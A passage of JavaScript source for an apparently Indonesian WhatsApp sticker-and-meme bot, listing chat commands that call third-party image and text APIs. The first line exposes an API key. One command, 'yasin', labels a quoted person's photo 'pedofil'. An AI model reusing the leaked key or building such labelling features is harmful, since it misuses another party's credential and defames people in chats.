		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await lexxy.sendImageAsSticker(from, res.url, msg, { packname: packnamenya, author: authornya, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    
break
case prefix+'base64':{
if (!q) return reply(`Example :\n${command} Lexxy-Api`)
reply(mess.wait)
var encode = q
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base64&encode=${encode}`)
var textBase64 =`type : ${yogi.type}
string : ${yogi.string}
encode : ${yogi.encode}`
reply(textBase64)
}
break
case prefix+'base32':{
if (!q) return reply(`Example :\n${command} Lexxy-Api`)
reply(mess.wait)
var encode = q
var yogii = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base32&encode=${encode}`)
var yogi = yogii.result
var textBase32 =`type : ${yogi.type}
string : ${yogi.string}
encode : ${yogi.encode}`
reply(textBase32)
}
break
case prefix+'debase64':{
if (!q) return reply(`Example :\n${command} Lexxy-Api`)
reply(mess.wait)
var decode = q
var yogii = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base64&decode=${decode}`)
var yogi = yogii.result
var textDebase64 =`type : ${yogi.type}
enc : ${yogi.enc}
string : ${yogi.string}`
reply(textDebase64)
}
break
case prefix+'debase32':{
if (!q) return reply(`Example :\n${command} Lexxy-Api`)
reply(mess.wait)
var decode = q
var yogii = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base32&decode=${decode}`)
var yogi = yogii.result
var textDebase32 =`type : ${yogi.type}
enc : ${yogi.enc}
string : ${yogi.string}`
reply(textDebase32)
}
break

case prefix+'git': case prefix+'gitclone': {
if (!q) return reply('Linknya Mana?')
 reply(mess.wait)
  var regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
  var [, user, repo] = q.match(regex1) || []
  repo = repo.replace(/.git$/, '')
  var url = `https://api.github.com/repos/${user}/${repo}/zipball`
  var filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
  lexxy.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: msg })
}
  break
case prefix+'tts':{
var tts = await getBuffer(`https://hadi-api.herokuapp.com/api/tts?language=id&text=${q}`)
if (!q) return reply(`Contoh :\n${command} hallo`)
reply(mess.wait)
lexxy.sendMessage(from, {audio: tts, mimetype:'audio/mpeg', ptt:true }, {quoted:msg})
}
break
case prefix+'hilih':
case prefix+'halah':
case prefix+'huluh': 
case prefix+'heleh': 
case prefix+'holoh':
if (!quoted && !args[1]) reply(`Kirim/reply text dengan caption ${command}`)
var ter = command[1].toLowerCase()
var tex = quoted ? quoted.text ? quoted.text : q ? q : text : q ? q : text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))

break
case prefix+'logo1':{
if (!q) return reply(`Contoh :\n${command} rehan|riski`)
var args1 = q.split("|")[0]
var args2 = q.split("|")[1]
reply(mess.wait)
var bepp = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/tiktok-effect?text=${args1}&text2=${args2}`)
lexxy.sendMessage(from, { image: bepp, caption: `© ${q}` }, {quoted:msg})
}
break
case prefix+'logo2':{
if (!q) return reply(`Contoh :\n${command} yanto`)
reply(mess.wait)
var bepp = await getBuffer(`https://hadi-api.herokuapp.com/api/textpro/neon-devil-wings?teks=${q}`)
lexxy.sendMessage(from, { image: bepp, caption: `© ${q}` }, {quoted:msg})
}
break
case prefix+'logo3':{
if (!q) return reply(`Contoh :\n${command} yanto`)
reply(mess.wait)
var bepp = await getBuffer(`https://hadi-api.herokuapp.com/api/textpro/black-white-bear-mascot?teks=${q}`)
lexxy.sendMessage(from, { image: bepp, caption: `© ${q}` }, {quoted:msg})
}
break
case prefix+'nulis':
if (!q) return reply(`Yang Mau Di Tulis Apaan? Titit?\n\nContoh :\n${command} Lexxy`)
var teks = q
reply(mess.wait)
var nulis = encodeURIComponent(teks)
var res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
if (res.data.error) return reply(res.data.error)
  var buff = Buffer.from(res.data.result.split(',')[1], 'base64')
lexxy.sendMessage(from, { image: buff, caption: `Mager ya kak?🗿` }, { quoted: msg }).catch(e => {
  return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
break
case prefix+'attp':{
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
if (q.length > 75) return reply(`Teks nya kepanjangan`)
var anu = `https://hadi-api.herokuapp.com/api/canvas/attp?text=${q}`
let encmedia = await lexxy.sendImageAsSticker(from, anu, msg, { packname: packname, author: author, categories: 'd' })
await fs.unlinkSync(encmedia)
}
break
case prefix+'ttp':{
if (!q) return reply(`Contoh :\n${command} Lexxy`)
let anu = `https://hadi-api.herokuapp.com/api/canvas/ttp?text=${q}`
let encmedia = await lexxy.sendImageAsSticker(from, anu, msg, { packname: packnamenya, author: authornya, categories: 'd' })
await fs.unlinkSync(encmedia)
}
break
case prefix+'corona':
case prefix+'covid':{
if (!q) return reply(`Contoh :\n${command} malaysia`)
var covid = await fetchJson(`https://hadi-api.herokuapp.com/api/corohelp?negara=${q}`)
var ind = covid.result
let corna =`*COVID INFO*
negara : ${q}
terkonfirmasi : ${ind.terkonfirmasi}
meniggal : ${ind.meniggal}
sembuh : ${ind.sembuh}
update : ${ind.update}`
reply(corna)
}
break
case prefix+"stalkgithub":{
if (!q) return reply(`Contoh :\n${command} Lexxy24`)
reply(mess.wait)
var nama = q
var git = await fetchJson(`https://api.github.com/users/${nama}`)
var tbGit = await getBuffer(git.avatar_url)
let textGitthub =`*STALK-GITHUB*
id : ${git.id}
login : ${git.login}
html_url : ${git.html_url}
type : ${git.type}
admin : ${git.admin}
name : ${git.name}
location : ${git.location}
bio : ${git.bio}
public_repos : ${git.public_repos}
followers : ${git.followers}
following : ${git.following}
created : ${git.created_at}
updated : ${git.updated_at}`
lexxy.sendMessage(from, { image: tbGit, caption: textGitthub }, {quoted:msg})
}
break
case prefix+'npmstalk':{
if (!q) return reply(`Contoh :\n${command} @adiwajshing/baileys`)
var x = await fetchJson(`https://api.popcat.xyz/npm?q=${q}`)
if (x.error) return reply(x.error)
var npm_text =`*NPM STALKER*
name : ${x.name}
version : ${x.version}
description : ${x.description}
author : ${x.author}
author_email : ${x.author_email}
last_published : ${x.last_published}
maintainers : ${x.maintainers}
repository : ${x.repository}

keywords : ${x.keywords}`
reply(npm_text)
}
break
case prefix+'infogempa':{
reply(mess.wait)
var anu = await fetchJson(`https://hadi-api.herokuapp.com/api/infogempa`)
var i = anu.result
var teksGem = `*INFO-GEMPA*
*waktu :* ${i.waktu}
*kordinat :* ${i.kordinat}
*getaran :* ${i.magnitudo}
*kedalaman :* ${i.kedalaman}
*lokasi :* ${i.lokasi}
*dirasakan :* ${i.dirasakan}`
reply(teksGem)
}
break
case prefix+'font1':{
var font = await fetchJson(`https://hadi-api.herokuapp.com/api/font?teks=${q}`)
if (font.Error) return reply(`Contoh :\n${command} Lexxy`)
reply(font.result)
}
break
case prefix+'font2':{
var font = await fetchJson(`https://hadi-api.herokuapp.com/api/font2?teks=${q}`)
if (font.Error) return reply(`Contoh :\n${command} Lexxy`)
reply(font.result)
}
break
case prefix+'font3':{
if (!q) return reply(`Contoh :\n${command} Lexxy`)
var font = await fetchJson(`https://api.popcat.xyz/doublestruck?text=${q}`)
reply(font.text)
}
break
case prefix+'ssweb':
if (!q) return reply(`Format Invalid Atau Url Yang Kamu Ketik Tidak Di Temukan !!\n\nContoh :\n${command} google.com`)
var web = `https://hadi-api.herokuapp.com/api/ssweb?url=${q}&device=desktop&full=on`
lexxy.sendMessage(from, { image: { url: web }, caption: 'Done!!' }, {quoted:msg})
break

case prefix+'lirik':
if (args.length < 2) return reply(`Kirim perintah ${command} judul lagu\n\n_Contoh_\n${command} angel baby`)
reply(mess.wait)
Musikmatch(q).then(async(data) => {
var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
lexxy.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: msg })
}).catch(() => reply(`Judul lagu tidak ditemukan`))
break
case prefix+'grupwa': case prefix+'searchgrup':
if (args.length < 2) return reply(`Kirim perintah ${command} nama grup\n\n_Contoh_\n${command} editor`)
reply(mess.wait)
require('./lib/grupwa').grupwa(q).then(async(data) => {
if (data.length == 0) return reply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data.result) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
reply(teks)
}).catch(() => reply(mess.error.api))
break
case prefix+'pinterest':
if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
var jumlah;
if (q.includes('--')) jumlah = q.split('--')[1]
if (jumlah > 20) return reply(`Maksimal 20`)
reply(mess.wait)
                // addCountCmd('#pinterest', sender, _cmd)
                   pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
                     if (q.includes('--')) {
                       if (data.result.length < jumlah) {
                         jumlah = data.result.length
                         reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
                       }
                       for (let i = 0; i < jumlah; i++) {
                         lexxy.sendMessage(from, { image: { url: data.result[i] }})
                       }
                    //   limitAdd(sender, limit)
                     } else {
                       var but = [{ buttonId: command+ ' '+q, buttonText: { displayText: `Next Photo` }, type: 1 }]
                     lexxy.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
                     }
                   })
                   break
case prefix+'google': {
  if (!q) return reply(`Example :\n${command} Elon Musk`)
  reply(mess.wait)
  let google = require('google-it')
  google({'query': q}).then(res => {
  let teks = `*Google Search From : ${q}*\n\n`
  for (let g of res) {
  teks += `📛 *Title* : ${g.title}\n`
  teks += `📱 *Description* : ${g.snippet}\n`
  teks += `🔗 *Link* : ${g.link}\n\n\n`
  } 
  reply(teks)
  })
}
  break
case prefix+'gimage': {
 if (!q) return reply(`Example : \n${command} tsunade`)
  reply(mess.wait)
  let gis = require('g-i-s')
  gis(q, async (error, result) => {
  var n = result
 var images = n[Math.floor(Math.random() * n.length)].url
  lexxy.sendMessage(from, { image: { url: images }, caption: `*Google Image*\n📛 *Judul* : ${q}\n*🔗 Media Url* : ${images}`}, { quoted: msg })
 })
}
  break
case prefix+'tourl':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
reply(`https://telegra.ph${json[0].src}`)
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'hitler':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api-yogipw.herokuapp.com/api/imgedit/hitler?url=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'police':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api-yogipw.herokuapp.com/api/imgedit/police?url=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'setthumb':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/logo.jpg`)
}
reply('Sukses Ganti Thumbnail Bot')
}
break

case prefix+'petimati':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api-yogipw.herokuapp.com/api/imgedit/petimati?url=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'yasin':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://hadi-api.herokuapp.com/api/canvas/yasin?name=pedofil&url=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'jail':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/jail?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'wanted':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/wanted?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'unfor':{
if (!q) return reply(`Example :\n${command} Cara membuat kue`)
let media =`https://api.popcat.xyz/unforgivable?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'sadcat':{
if (!q) return reply(`Example :\n${command} hello`)
let media =`https://api.popcat.xyz/sadcat?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'ogway':{
if (!q) return reply(`Example :\n${command} lexxy-api.xyz`)
let media =`https://api.popcat.xyz/oogway?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'biden':{
if (!q) return reply(`Example :\n${command} hello`)
let media =`https://api.popcat.xyz/biden?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'pikachu':{
if (!q) return reply(`Example :\n${command} hello`)
let media =`https://api.popcat.xyz/pikachu?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'pooh':{
if (!q) return reply(`Contoh :\n${command} discord bot|making api`)
var text1 = q.split("|")[0]
var text2 = q.split("|")[1]
let media =`https://api.popcat.xyz/pooh?text1=${text1}&text2=${text2}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'drake':{
if (!q) return reply(`Contoh :\n${command} amongus|amogus`)
var text1 = q.split("|")[0]
var text2 = q.split("|")[1]
let media =`https://api.popcat.xyz/drake?text1=${text1}&text2=${text2}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'facts':{
if (!q) return reply(`Contoh :\n${command} amogus`)
let media =`https://api.popcat.xyz/facts?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'alert':{
if (!q) return reply(`Contoh :\n${command} amogus`)
let media =`https://api.popcat.xyz/alert?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'caution':{
if (!q) return reply(`Contoh :\n${command} amogus`)
let media =`https://api.popcat.xyz/caution?text=${q}`
lexxy.sendMessage(from, { image: { url: media }, caption: 'done!!'}, {quoted:msg})
}
break
case prefix+'smeme':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command} Hai|Lexxy`)
reply(mess.wait)
var text1NANG = q.split("|")[0]
var text2NANG = q.split("|")[1]
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')

let media = `https://api.memegen.link/images/custom/${text1NANG}/${text2NANG}.png?background=https://telegra.ph${json[0].src}`

lexxy.sendMessage(from, { image: { url: media }, caption: '© Smeme'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
  break
case prefix+'clown':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/clown?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: '© Clown'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
  break
case prefix+'uncover':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/uncover?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: '© Uncover'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
  break
case prefix+'overhead':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/jokeoverhead?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: '© Overhead'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
  break
case prefix+'invert':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/invert?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: '© Invert'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
  break
case prefix+'blur':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/blur?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: '© Blur'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
  break
case prefix+'jad':
if (!isQuotedImage) return reply(`reply foto dengan pesan ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media = `https://api.popcat.xyz/ad?image=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: '© Jad'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
  break
case prefix+'resize':
if (!isQuotedImage) return reply(`reply foto dengan caption ${command}`)
reply(mess.wait)
if (isImage || isQuotedImage){
let mediat = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(mediat), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
reply('Proses Convert..')
let media  = `https://hadi-api.herokuapp.com/api/canvas/image/resize?width=300&height=200&url=https://telegra.ph${json[0].src}`
lexxy.sendMessage(from, { image: { url: media }, caption: '© Resize'}, {quoted:msg})
if (fs.existsSync(mediat)) fs.unlinkSync(mediat)
 })
}
break
case prefix+'reverse':{
if (!q) return reply(`Contoh :\n${command} Query`)
var z = await fetchJson(`https://api.popcat.xyz/reverse?text=${q}`)
reply(z.text)
}
break
case prefix+'swm': case prefix+'wm': case prefix+'take': case prefix+'takestiker':
case prefix+'stikerwm': case prefix+'stickerwm': case prefix+'takesticker':
var pname = q.split('|')[0] ? q.split('|')[0] : q
                   var athor = q.split('|')[1] ? q.split('|')[1] : ''
                   if (isImage || isQuotedImage) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                  //   addCountCmd('#stickerwm', sender, _cmd)
                     var media = await lexxy.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}.jpeg`)
                     var opt = { packname: pname, author: athor }
                     lexxy.sendImageAsSticker(from, media, msg, opt)
                     .then( res => {
                     fs.unlinkSync(media)
                     }).catch((e) => reply(mess.error.api))
                   } else if (isVideo || isQuotedVideo) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     reply(mess.wait)
                    // addCountCmd('#stickerwm', sender, _cmd)
                     var media = await lexxy.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
                     var opt = { packname: pname, author: athor }
                     lexxy.sendImageAsSticker(from, media, msg, opt)
                     .then( res => {
                       fs.unlinkSync(media)
                     }).catch((e) => reply(mess.error.api))
                   } else if (isQuotedSticker) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     reply(mess.wait)
                   //  addCountCmd('#takesticker', sender, _cmd)
                     var media = quotedMsg['stickerMessage'].isAnimated !== true ? await lexxy.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.jpeg`) : await lexxy.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.webp`)
                     media = quotedMsg['stickerMessage'].isAnimated !== true ? media : (await webp2mp4File(media)).data
                     var opt = { packname: pname, author: athor }
                     quotedMsg['stickerMessage'].isAnimated !== true ?
                      lexxy.sendImageAsSticker(from, media, msg, opt)
                       .then( res => { fs.unlinkSync(media) }).catch((e) => reply(mess.error.api))
                       : lexxy.sendVideoAsSticker(from, media, msg, opt)
                        .then( res => { fs.unlinkSync(`./sticker/${sender}.webp`) }).catch((e) => reply(mess.error.api))
                   } else {
                     reply(`Kirim/Balas gambar/video/sticker dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                   }
                   break
case prefix+'toimg': case prefix+'toimage':
                case prefix+'tovid': case prefix+'tovideo':
                   
                   if (!isQuotedSticker) return reply(`Reply stikernya!`)
                   var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                   var buffer = Buffer.from([])
                   for await(const chunk of stream) {
                     buffer = Buffer.concat([buffer, chunk])
                   }
                   var rand1 = 'media/'+getRandom('.webp')
                   var rand2 = 'media/'+getRandom('.png')
                   fs.writeFileSync(`./${rand1}`, buffer)
                   if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
                     reply(mess.wait)
                     exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
                       fs.unlinkSync(`./${rand1}`)
                       if (err) return reply(mess.error.api)
                       lexxy.sendMessage(from, {caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: fkontak })
                       
                       fs.unlinkSync(`./${rand2}`)
                     })
                   } else {
                     reply(mess.wait)
                     webp2mp4File(`./${rand1}`).then(async(data) => {
                       fs.unlinkSync(`./${rand1}`)
                       lexxy.sendMessage(from, {caption: `*Sticker Convert To Video!*`, video: await getBuffer(data.data) }, { quoted: fkontak })
                       
                     })
                   }
                   
			break
case prefix+'sticker': case prefix+'stiker': case prefix+'s':
			    if (isImage || isQuotedImage) {
		           var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
			       var buffer = Buffer.from([])
			       for await(const chunk of stream) {
			          buffer = Buffer.concat([buffer, chunk])
			       }
			       reply(mess.wait)
			       var rand1 = 'sticker/'+getRandom('.jpg')
			       var rand2 = 'sticker/'+getRandom('.webp')
			       fs.writeFileSync(`./${rand1}`, buffer)
			       ffmpeg(`./${rand1}`)
				.on("error", console.error)
				.on("end", () => {
				  exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				    lexxy.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				    
					fs.unlinkSync(`./${rand1}`)
			            fs.unlinkSync(`./${rand2}`)
			          })
				 })
				.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				.toFormat('webp')
				.save(`${rand2}`)
			    } else if (isVideo || isQuotedVideo) {
				 var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
				 var buffer = Buffer.from([])
				 for await(const chunk of stream) {
				   buffer = Buffer.concat([buffer, chunk])
				 }
			     var rand1 = 'sticker/'+getRandom('.mp4')
				 var rand2 = 'sticker/'+getRandom('.webp')
			         fs.writeFileSync(`./${rand1}`, buffer)
			         ffmpeg(`./${rand1}`)
				  .on("error", console.error)
				  .on("end", () => {
				    exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				      lexxy.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				      
					  fs.unlinkSync(`./${rand1}`)
				      fs.unlinkSync(`./${rand2}`)
				    })
				  })
				 .addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				 .toFormat('webp')
				 .save(`${rand2}`)
                } else {
			       reply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
			    }
			    
			break
case prefix+'emojimix2': {
	    if (!q) return reply(`Example :\n${command} 😅`)
	    var TextNyaStick = body.slice(11)
